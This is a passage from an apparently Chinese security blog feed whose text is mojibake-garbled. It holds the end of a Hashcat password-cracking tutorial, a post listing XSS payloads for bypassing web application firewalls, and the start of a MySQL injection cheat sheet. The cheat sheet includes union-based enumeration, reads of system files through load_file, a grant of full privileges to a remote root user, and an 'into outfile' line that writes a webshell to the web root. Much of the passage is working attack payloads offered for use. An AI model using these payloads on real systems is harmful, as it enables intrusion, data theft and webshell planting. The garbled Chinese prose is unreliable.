-eï¼Œ--salt-file =æ–‡ä»¶ç›ï¼Œæ–‡ä»¶æ— ç›hashlists

Increment:
      -i,     --increment                   
     --increment-min=NUM           æœ€å°å€¼
     --increment-max=NUM           æœ€å¤§å€¼
</code></pre><h1 id="0x05-å…·ä½“æ“ä½œ"><a href="#0x05-å…·ä½“æ“ä½œ" class="headerlink" title="0x05 å…·ä½“æ“ä½œ"></a>0x05 å…·ä½“æ“ä½œ</h1><h2 id="ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£"><a href="#ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£" class="headerlink" title="ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£"></a>ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£</h2><p>ä½¿ç”¨ç»™çš„å­—å…¸å’Œhashè¿›è¡Œç ´è§£</p>
<pre><code>Hashcat.exe -m 500 example500.hash example.dict
cudaHashcat32.exe -m 500 example500.hash example.dict &gt;result.txt
</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/hashcat_1.png" alt=""></p>
<h2 id="ä½¿ç”¨æ©ç è¿›è¡Œç ´è§£"><a href="#ä½¿ç”¨æ©ç è¿›è¡Œç ´è§£" class="headerlink" title="ä½¿ç”¨æ©ç è¿›è¡Œç ´è§£"></a>ä½¿ç”¨æ©ç è¿›è¡Œç ´è§£</h2><pre><code>48E231E66FF8943DB0F6D2B6CB6536D2ï¼ˆxiaoming123456ï¼‰?l?l?l?l?l?l?l?l?d?d?d?d?d?d
hashcat.exe -m 0 -a 3 
48E231E66FF8943DB0F6D2B6CB6536D2 ?l?l?l?l?l?l?l?l?d?d?d?d?d?d
</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/hashcat_2.png" alt=""></p>
<h2 id="HashCatå‚æ•°ä¼˜åŒ–"><a href="#HashCatå‚æ•°ä¼˜åŒ–" class="headerlink" title="HashCatå‚æ•°ä¼˜åŒ–"></a>HashCatå‚æ•°ä¼˜åŒ–</h2><p>HashCatæœ¬èº«è€ƒè™‘åˆ°ç³»ç»Ÿèµ„æºçš„åˆ†é…ï¼Œé»˜è®¤å‚æ•°ä¸‹å¹¶æ²¡æœ‰æœ€å¤§åŒ–çš„æ¥ä½¿ç”¨ç¡¬ä»¶èµ„æºã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®©ç ´è§£é€Ÿåº¦æœ€å¤§åŒ–ï¼Œå°±éœ€è¦å¯¹ä¸€äº›å‚æ•°è¿›è¡Œé…ç½®ã€‚</p>
<ol>
<li><p>Workload tuning è´Ÿè½½è°ƒä¼˜ã€‚<br>è¯¥å‚æ•°æ”¯æŒçš„å€¼æœ‰1,8,40,80,160</p>
<pre><code>--gpu-accel 160
</code></pre><p>å¯ä»¥è®©GPUå‘æŒ¥æœ€å¤§æ€§èƒ½ã€‚</p>
</li>
<li><p>Gpu loops è´Ÿè½½å¾®è°ƒ<br>è¯¥å‚æ•°æ”¯æŒçš„å€¼çš„èŒƒå›´æ˜¯8-1024ï¼ˆæœ‰äº›ç®—æ³•åªæ”¯æŒåˆ°1000ï¼‰ã€‚</p>
<pre><code>--gpu-loops 1024
</code></pre><p>å¯ä»¥è®©GPUå‘æŒ¥æœ€å¤§æ€§èƒ½ã€‚</p>
</li>
<li><p>Segment size å­—å…¸ç¼“å­˜å¤§å°<br>è¯¥å‚æ•°æ˜¯è®¾ç½®å†…å­˜ç¼“å­˜çš„å¤§å°ï¼Œä½œç”¨æ˜¯å°†å­—å…¸æ”¾å…¥å†…å­˜ç¼“å­˜ä»¥åŠ å¿«å­—å…¸ç ´è§£é€Ÿåº¦ï¼Œé»˜è®¤ä¸º32MBï¼Œå¯ä»¥æ ¹æ®è‡ªèº«å†…å­˜æƒ…å†µè¿›è¡Œè®¾ç½®ï¼Œå½“ç„¶æ˜¯è¶Šå¤§è¶Šå¥½XDã€‚</p>
<pre><code>--segment-size 512
</code></pre><p>å¯ä»¥æé«˜å¤§å­—å…¸ç ´è§£çš„é€Ÿåº¦ã€‚</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> Hashcat </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS payload]]></title>
      <url>/2016/08/05/XSS-payload/</url>
      <content type="html"><![CDATA[<p>æ”¶é›†çš„ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„XSS payloadï¼Œç”¨äºç»•è¿‡wafåŠä¸€äº›åº”ç”¨ç¨‹åºï¼Œå…·ä½“çš„åˆ†ç±»å°±ä¸è¯´äº†ï¼Œä¸€çœ‹å°±æ˜ç™½çš„ã€‚</p>
<a id="more"></a>
<pre><code>&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;

\&lt;iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)&gt;

&lt;img src=&apos;1&apos; onerror\x00=alert(0) /&gt;

&lt;img src=&apos;1&apos; onerror/=alert(0) /&gt;

&lt;img src=&apos;1&apos; onerror\x0b=alert(0) /&gt;

&lt;img src=&apos;1&apos; onerror=\x00alert(0) /&gt;

&lt;\x00img src=&apos;1&apos; onerror=alert(0) /&gt;

&lt;script\x00&gt;alert(1)&lt;/script&gt;

&lt;i\x00mg src=&apos;1&apos; onerror=alert(0) /&gt;

&lt;img/src=&apos;1&apos;/onerror=alert(0)&gt;

&lt;img\x0bsrc=&apos;1&apos;\x0bonerror=alert(0)&gt;

&lt;img src=&apos;1&apos;&apos;onerror=&apos;alert(0)&apos;&gt;
&lt;img src=&apos;1&apos;&quot;onerror=&quot;alert(0)&quot;&gt;

&lt;img src=&apos;1&apos;\x00onerror=alert(0)&gt;

&lt;img src=&apos;1&apos;onerror=alert(0)&gt;


Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
&lt;iframe src=&quot;\x01javascript:alert(0)&quot;&gt;&lt;/iframe&gt; &lt;!-- Example for Chrome --&gt;

&lt;img src=&apos;1&apos; onerror=&apos;alert(0)&apos; &lt;

&lt;&lt;script&gt;alert(0)&lt;/script&gt;

&lt;style&gt;body{background-color:expression\(alert(1))}&lt;/style&gt;

&lt;script&gt;document.write(&apos;&lt;a hr\ef=j\avas\cript\:a\lert(2)&gt;blah&lt;/a&gt;&apos;);&lt;/script&gt;

HTML Encoding
&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt;
&lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
&lt;iframe src=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;&lt;/iframe&gt;

URL Encoding
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/iframe&gt;

CSS Hexadecimal Encoding
&lt;div style=&quot;x:expression(alert(1))&quot;&gt;Joker&lt;/div&gt;
&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;Joker&lt;/div&gt;
&lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;Joker&lt;/div&gt;
&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;Joker&lt;/div&gt;

JavaScript
&lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt;
&lt;script&gt;document.write(&apos;\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E&apos;);&lt;/script&gt;
&lt;script&gt;document.write(&apos;\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076&apos;);&lt;/script&gt;
&lt;script&gt;document.write(&apos;\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E&apos;);&lt;/script&gt;

JavaScript
&lt;script&gt;document.write(&apos;&lt;img src=1 onerror=alert(1)&gt;&apos;);&lt;/script&gt;
&lt;script&gt;document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));&lt;/script&gt;

JavaScript
&lt;script&gt;alert(123)&lt;/script&gt;
&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;/script&gt;

Overlong UTF-8
&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC
&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE
&apos; = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
&quot; = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

&lt;img src=&quot;1&quot; onnerror=&quot;alert(1)&quot;&gt;
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

UTF-7 (Missing charset?)
&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot; /&gt;
    +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

Unicode .NET Ugliness
&lt;script&gt;alert(1)&lt;/script&gt;
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

Classic ASP
&lt;img src=&quot;1&quot; onerror=&quot;alert(&apos;1&apos;)&quot;&gt;
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

and/or Useful features.
HTML 5 (Not comphrensive)
&lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadedmetadata=&quot;alert(1)&quot; /&gt;
&lt;video src=&quot;http://www.w3schools.com/html5/movie.ogg&quot; onloadstart=&quot;alert(1)&quot; /&gt;

Usuage of non-existent elements
&lt;blah style=&quot;blah:expression(alert(1))&quot; /&gt;

CSS Comments
&lt;div style=&quot;z:exp/*anything*/res/*here*/sion(alert(1))&quot; /&gt;

JavaScript functions
&lt;script&gt;window[&apos;alert&apos;](0)&lt;/script&gt;
&lt;script&gt;parent[&apos;alert&apos;](1)&lt;/script&gt;
&lt;script&gt;self[&apos;alert&apos;](2)&lt;/script&gt;
&lt;script&gt;top[&apos;alert&apos;](3)&lt;/script&gt;

JavaScript into HTML
&lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt;

&lt;script&gt;
var junk = &apos;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;;
&lt;/script&gt;

HTML CSS
&lt;style&gt;
body { background-image:url(&apos;http://www.blah.com/&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;); }
&lt;/style&gt;

XML documents
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;someElement&gt;
    &lt;a xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;a:body onload=&apos;alert(1)&apos;/&gt;&lt;/a&gt;
&lt;/someElement&gt;

URI Schemes
&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;
&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt; (IE)
&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari)
&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt; (Firefox, Chrome, Safari)

HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&amp;a=val2
ASP.NET     a = val1,val2
ASP         a = val1,val2
JSP         a = val1
PHP         a = val2

&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;
&lt;script&gt;eval(location.hash)&lt;/script&gt; (Firefox)

http://target.com/something.jsp?inject=&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;#alert(1)

&lt;iframe src=&quot;http://target.com/something.jsp?inject=&lt;script&gt;eval(name)&lt;/script&gt;&quot; name=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;

&lt;script&gt;
$=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();
&lt;/script&gt;

&lt;script&gt;
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
&lt;/script&gt;
</code></pre><p>`</p>
]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> XSS </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysqlæ³¨å…¥æ€»ç»“]]></title>
      <url>/2016/08/02/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>mysqlä¸€èˆ¬æ³¨å…¥(select)ï¼Œmysqlä¸€èˆ¬æ³¨å…¥(insertã€update)ï¼ŒmysqlæŠ¥é”™æ³¨å…¥ï¼Œmysqlä¸€èˆ¬ç›²æ³¨ï¼Œmysqlæ—¶é—´ç›²æ³¨ï¼Œmysqlçš„ä¸€äº›ç‰¹æ€§åœ¨SQLæ³¨å…¥ä¸­çš„åˆ©ç”¨ã€‚</p>
<a id="more"></a>
<h1 id="0x00-mysqlä¸€èˆ¬æ³¨å…¥-select"><a href="#0x00-mysqlä¸€èˆ¬æ³¨å…¥-select" class="headerlink" title="0x00 mysqlä¸€èˆ¬æ³¨å…¥(select)"></a>0x00 mysqlä¸€èˆ¬æ³¨å…¥(select)</h1><p>1.æ³¨é‡Šç¬¦:<br>#,/*,--</p>
<p>2.è¿‡æ»¤ç©ºæ ¼æ³¨å…¥<br>ä½¿ç”¨/**/æˆ–()æˆ–+ä»£æ›¿ç©ºæ ¼</p>
<p>%0c = form feed, new page</p>
<p>%09 = horizontal tab</p>
<p>%0d = carriage return</p>
<p>%0a = line feed, new line</p>
<p>3.å¤šæ¡æ•°æ®æ˜¾ç¤º</p>
<pre><code>concat()
group_concat()
concat_ws()
</code></pre><p>4.ç›¸å…³å‡½æ•°</p>
<pre><code>system_user() ç³»ç»Ÿç”¨æˆ·å
user() ç”¨æˆ·å
current_user å½“å‰ç”¨æˆ·å
session_user()è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å
database() æ•°æ®åº“å
version() MYSQLæ•°æ®åº“ç‰ˆæœ¬
load_file() MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•°
@@datadir è¯»å–æ•°æ®åº“è·¯å¾„
@@basedir MYSQL å®‰è£…è·¯å¾„
@@version_compile_os æ“ä½œç³»ç»Ÿ
GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION;
</code></pre><p>5.mysqlä¸€èˆ¬æ³¨å…¥è¯­å¥</p>
<pre><code>çŒœå­—æ®µæ•°
order by n#
æŸ¥çœ‹mysqlåŸºæœ¬ä¿¡æ¯
and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7#
æŸ¥è¯¢æ•°æ®åº“
and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1#
and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata#
æŸ¥è¯¢è¡¨å
and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç  limit 1,1#
and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç #
æŸ¥è¯¢å­—æ®µ
and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=è¡¨åçš„åå…­è¿›åˆ¶ç¼–ç  and table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç  limit 1,1#
and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=è¡¨åçš„åå…­è¿›åˆ¶ç¼–ç  and table_schema=æ•°æ®åº“çš„16è¿›åˆ¶ç¼–ç #
æŸ¥è¯¢æ•°æ®
and 1=2 union select 1,2,3,å­—æ®µ1,5,å­—æ®µ2,7,8 from æ•°æ®åº“.è¡¨#
åˆ¤æ–­æ˜¯å¦å…·æœ‰è¯»å†™æƒé™
and (select count(*) from mysql.user)&gt;0#
è¯»æƒé™
and (select count(file_priv) from mysql.user)&gt;0#
å†™æƒé™
</code></pre><p>6.mysqlè¯»å–å†™å…¥æ–‡ä»¶</p>
<pre><code>å¿…å¤‡æ¡ä»¶ï¼š
è¯»ï¼šfileæƒé™å¿…å¤‡
å†™ï¼š1.ç»å¯¹è·¯å¾„ 2.unionä½¿ç”¨ 3. å¯ä»¥ä½¿ç”¨&apos;&apos;
</code></pre><p>â€”â€”â€”â€”â€”â€”â€”â€”-è¯»â€”â€”â€”â€”â€”â€”â€”-</p>
<pre><code>mysql3.xè¯»å–æ–¹æ³•
create table a(å‘½ä»¤ æ–‡æœ¬å);
load data infile &apos;c:\\xxx\\xxx\\xxx.txt&apos; into table a;
select * from a;
mysql4.xè¯»å–æ–¹æ³•
é™¤ä¸Šè¿°æ–¹æ³•è¿˜å¯ä»¥ä½¿ç”¨load_file()
create table a(å‘½ä»¤ æ–‡æœ¬å);
insert into a(å‘½ä»¤) values(load_file(&apos;c:\\ddd\\ddd\\ddd.txt&apos;));
select * from a;
mysql5.xè¯»å–æ–¹æ³•
ä¸Šè¿°ä¸¤ç§éƒ½å¯ä»¥
è¯»å–æ–‡ä»¶æŠ€å·§ï¼š
load_file(char(32,26,56,66))
load_file(0x633A5C626F6F742E696E69)   c:\boot.ini
</code></pre><p>â€”â€”â€”â€”â€”â€”â€”â€”-å†™â€”â€”â€”â€”â€”â€”â€”-</p>
<pre><code>into outfileå†™æ–‡ä»¶
union select 1,2,3,char(è¿™é‡Œå†™å…¥ä½ è½¬æ¢æˆ10è¿›åˆ¶æˆ–16è¿›åˆ¶çš„ä¸€å¥è¯æœ¨é©¬ä»£ç ),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;#
union select 1,2,3,load_file(&apos;d:\web\logo123.jpg&apos;),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;#
</code></pre><h1 id="0x01-mysqlä¸€èˆ¬æ³¨å…¥-insertã€update"><a href="#0x01-mysqlä¸€èˆ¬æ³¨å…¥-insertã€update" class="headerlink" title="0x01 mysqlä¸€èˆ¬æ³¨å…¥(insertã€update)"></a>0x01 mysqlä¸€èˆ¬æ³¨å…¥(insertã€update)</h1><p>ä¸€èˆ¬æƒ…å†µåŒä¸Š</p>
<p>mysqlä¸€èˆ¬è¯·æ±‚mysql_queryä¸æ”¯æŒå¤šè¯­å¥æ‰§è¡Œï¼Œmysqliå¯ä»¥ã€‚</p>
<p>insertæ³¨å…¥å¤šä½¿ç”¨æŠ¥é”™æ³¨å…¥!</p>
<pre><code>1.å¦‚æœå¯ä»¥ç›´æ¥æ’å…¥ç®¡ç†å‘˜å¯ä»¥ç›´æ¥ä½¿ç”¨!
insert into user(username,password) values(&apos;xxxx&apos;,&apos; xxxx&apos;),(&apos;dddd&apos;,&apos;dddd&apos;)/* &apos;);
2.å¦‚æœå¯ä»¥æ’å…¥ä¸€äº›æ•°æ®ï¼Œè¿™äº›æ•°æ®ä¼šåœ¨ç½‘é¡µä¸­æ˜¾ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆxxså’Œcsrfæ¥è·å–cookiesæˆ–getshell
</code></pre><p>updateæ³¨å…¥åŒä¸Š</p>
<h1 id="0x02-mysqlæŠ¥é”™æ³¨å…¥"><a href="#0x02-mysqlæŠ¥é”™æ³¨å…¥" class="headerlink" title="0x02 mysqlæŠ¥é”™æ³¨å…¥"></a>0x02 mysqlæŠ¥é”™æ³¨å…¥</h1><h2 id="1ã€é€šè¿‡flooræš´é”™"><a href="#1ã€é€šè¿‡flooræš´é”™" class="headerlink" title="1ã€é€šè¿‡flooræš´é”™"></a>1ã€é€šè¿‡flooræš´é”™</h2><p>FLOOR(x)å‡½æ•°ç”¨äºè¿”å›å°äºæˆ–ç­‰äºxçš„æœ€å¤§æ•´æ•°å€¼ã€‚</p>
<pre><code>é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯floor
(random(0)*2)çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1ï¼ˆgroup by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€
è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚
group by floor(random(0)*2)å‡ºé”™çš„åŸå› æ˜¯keyæ˜¯ä¸ªéšæœºæ•°ï¼Œæ£€æµ‹ä¸´æ—¶è¡¨ä¸­keyæ˜¯å¦å­˜åœ¨æ—¶è®¡ç®—äº†ä¸€ä¸‹floor(random(0)*2)å¯èƒ½ä¸º0ï¼Œå¦‚æœæ­¤æ—¶ä¸´æ—¶è¡¨åªæœ‰keyä¸º1çš„è¡Œï¼Œä¸å­˜åœ¨keyä¸º0çš„è¡Œï¼Œé‚£ä¹ˆæ•°æ®åº“è¦å°†è¯¥æ¡è®°å½•æ’å…¥ä¸´æ—¶è¡¨ï¼Œç”±äºæ˜¯éšæœºæ•°ï¼Œæ’æ—¶åˆè¦è®¡ç®—ä¸€ä¸‹éšæœºå€¼ï¼Œæ­¤æ—¶floor(random(0)*2)ç»“æœå¯èƒ½ä¸º1ï¼Œå°±ä¼šå¯¼è‡´æ’å…¥æ—¶å†²çªè€ŒæŠ¥é”™ã€‚å³æ£€æµ‹æ—¶å’Œæ’å…¥æ—¶ä¸¤æ¬¡è®¡ç®—äº†éšæœºæ•°çš„å€¼ã€‚
